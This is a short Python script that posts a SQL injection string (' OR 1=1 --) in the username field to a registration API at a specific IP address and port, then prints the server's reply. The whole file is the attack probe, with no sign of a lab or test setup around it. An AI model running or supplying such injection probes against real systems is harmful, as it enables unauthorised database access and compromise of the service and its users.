import requests

url = "http://98.70.102.40:8080/api/auth/register"

payload = {
    "username": "testuser123' OR 1=1 --",
    # This payload attempts to inject SQL code into the username field
    "password": "testpassword123",
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, json=payload, headers=headers)

print("Response: ",  response.status_code)
print("Response Body: ", response.text) 